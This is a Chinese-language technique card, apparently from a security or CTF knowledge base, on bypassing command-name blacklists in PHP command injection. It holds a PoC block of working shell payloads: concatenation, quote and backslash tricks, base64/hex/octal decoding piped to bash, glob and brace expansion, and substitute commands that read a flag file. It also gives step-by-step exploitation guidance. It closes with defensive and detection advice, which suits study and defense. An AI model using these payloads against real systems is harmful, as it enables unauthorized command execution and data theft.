---
id: web-php-rce-command-name-blacklist-equivalent-rewrites
title: Linux 命令注入黑名单绕过的命令名等价改写：拼接/引号/反斜杠/位置参数/编码/通配符/替代命令
type: scenario
domain: web
path: web/php/rce
technique: command-name-blacklist-equivalent-rewrites
aliases:
- 命令名黑名单绕过
- cat 黑名单绕过
- 命令拼接绕过
- shell 通配符绕过命令过滤
- 命令替代绕过
- $IFS 之外的命令名改写
tags:
- php
- rce
- command-injection
- waf-bypass
- shell
- blacklist
- glob
- encoding
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V526
  verified_at: '2026-11-11T14:58:55+08:00'
  notes: 已对照原文与全部53张图核对：变量拼接(图15)、引号(图16)、反斜杠(图17)、位置参数(图18/19)、base64/xxd/printf编码(图20及正文)、?/*/[]/{}通配(图21-26)、tac/more/less/head/tail/nl/sort替代(图27)均与卡内PoC一致。已修正触发条件中『POSIX sh/bash 支持 brace 展开』的表述为『花括号展开属 bash/ksh 扩展』。未验证点：PoC未在目标环境重放（原文为本地bash演示）。
---

## 一句话结论

当命令注入防护只是对原始输入做命令名/关键字黑名单（如禁用 `cat`、`flag`、`bash`）时，可以利用 shell 在解析阶段才进行的拼接、引号删除、反斜杠转义、位置参数替换、命令替换、编码解码与通配符展开，把同一个命令改写成不含被禁字面量的等价形式，让过滤器看到「无害字符串」而 shell 执行原始命令。

## 原理

- 过滤发生在 shell 解析之前：WAF/`preg_match`/`stripos` 只把输入当作原始文本匹配；`sh -c` 随后才做词法分析、引号删除、参数/命令替换、分词与路径名展开（glob）。两层对同一字符串的理解不同，是全部绕过的共同基础。
- 常见等价改写：
  - **变量拼接**：`a=c;b=at;c=fla;d=g;$a$b $c$d.txt` → `cat flag.txt`；原始串中不出现连续 `cat`/`flag`。
  - **引号删除**：`ca""t fla""g.txt`、`ca''t fla''g.txt`、`ca""t fla''g.txt`——空引号不产生字符，shell 拼接后仍是 `cat flag.txt`。
  - **反斜杠转义**：`ca\t fla\g.txt`——`\t` 被 shell 解释为字符 `t`，原文无 `cat`。
  - **位置参数**：`ca$1t fl$@ag.txt`、`ca$1t fl$2ag.txt`——脚本无对应参数时 `$1/$2/$@` 为空，等价于删除该位置字符。
  - **命令替换 + 编码**：`` `echo "Y2F0IGZsYWcudHh0"|base64 -d` `` 或 `echo BASE64|base64 -d|bash`；十六进制 `echo 0x...|xxd -r -p|bash`；八进制 `$(printf "\143\141\164...")`（`\143`=c、`\141`=a、`\164`=t）。
  - **通配符展开**：`?`（单字符）、`*`（任意串）、`[...]`（字符集）、`{...}`（花括号展开）可绕过文件名/命令名关键字：`cat fl?g.txt`、`cat f**`、`cat f[lc]ag.txt`、`cat fl{a,b,c}g.txt`、`c{a,b}t flag.txt`、`/???/???/?at`。
  - **替代命令**：`cat` 被禁时用 `tac`、`more`、`less`、`head`、`tail`、`nl`、`sort`、`tail -f` 等读取同一文件。
- 由于这些改写都产生合法的 shell 输入，只要目标命令存在、文件可读，最终执行效果与被禁命令完全相同。

## 触发条件

- 命令注入 sink 存在（`system`/`exec`/`shell_exec`/`popen` 等），且防护是对输入原文做字符串/正则黑名单。
- 目标为 bash 或兼容 shell（引号删除、参数/命令替换、glob 为 POSIX 能力；`{a,b}` 花括号展开属 bash/ksh 扩展，纯 POSIX sh 下不可用）；目标系统存在所需工具（base64/xxd/printf）。
- 被禁命令有等价替代或可被展开还原；文件名/路径可被通配符匹配。
- 过滤器没有在 shell 级别做规范化（如 `escapeshellarg`、白名单 IP 解析）——否则这些改写无效。

## 利用步骤

1. 先用最小 payload 判断过滤类型：提交 `;id`、`|id`、`$(id)` 等，观察回显/报错，区分「命令分隔符被禁」「命令名被禁」「目标文件名被禁」。
2. 若命令名被禁，按可用性依次尝试：变量拼接 → 引号/反斜杠 → 位置参数 → 编码（base64/hex/octal）→ 通配符 → 替代命令。
3. 用 `ls`/`echo` 或通配符先列出目录，确认可匹配的文件名（如 `fl*`、`f[lc]ag.txt`）。
4. 组合空格绕过手段（`${IFS}`、重定向、花括号，见关联卡）构造完整命令并验证输出。
5. 记录每一步的原始请求与回显，确认最终命令等价于被禁命令。

## PoC

```bash
# 变量拼接
a=c;b=at;c=fla;d=g;$a$b $c$d.txt

# 引号 / 反斜杠 / 位置参数
ca""t fla""g.txt
ca\t fla\g.txt
ca$1t fl$@ag.txt

# 编码
`echo "Y2F0IGZsYWcudHh0"|base64 -d`
echo "0x63617420666c61672e7478740a" | xxd -r -p | bash
$(printf "\143\141\164\040\146\154\141\147\056\164\170\164")

# 通配符 / 花括号 / 替代命令
cat fl?g.txt
cat f[lc]ag.txt
cat fl{a,b,c}g.txt
c{a,b}t flag.txt
tac flag.txt; more flag.txt; head flag.txt; sort flag.txt
```

以上命令未在目标环境执行，仅作等价改写示意。

## 变体与关联

- 变体：有序关键字正则（如 `.*f.*l.*a.*g.*`）可用「反序拼接」绕过（先放 `ag` 再放 `fl`，让原文不出现 f→l→a→g 顺序），并配合 `$IFS$1` 分隔，见 [[ctf-web-ordered-flag-regex-concat-reorder-bypass]]。
- 变体：命令名被禁但 `bash` 未禁时，可 base64 编码整条命令交给 `bash`；若 `bash` 被禁，用 `sh`/`dash`/`perl`/`python` 执行。
- 关联：[[web-php-rce-shell-exec-quote-concat-glob-flag]]（引号+glob 的早期版本卡）、[[ai-security-agent-security-bash-expansion-glob-command-filter-bypass]]（Bash 展开与检测层深度差）、[[web-php-rce-command-injection-space-slash-filter-bypass]]（空格/斜杠过滤）、[[web-php-rce-four-char-command-length-bypass]]（长度限制）。

## 检测与防御

- 防御：不要用黑名单过滤命令名；使用 `escapeshellarg`/`escapeshellcmd` 或参数化调用，最好以白名单方式校验输入（如 IP 用 `filter_var(..., FILTER_VALIDATE_IP)`）。
- 防御：避免 shell 拼接，改用语言内置 API（如 PHP `inet_pton` + 参数化命令或直接不发系统命令）。
- 检测：请求中出现变量赋值拼接、`$IFS`、`$@`、`$1`、base64/xxd/printf 解码管道、连续通配符与花括号展开等特征；命令执行日志中出现异常命令组合。
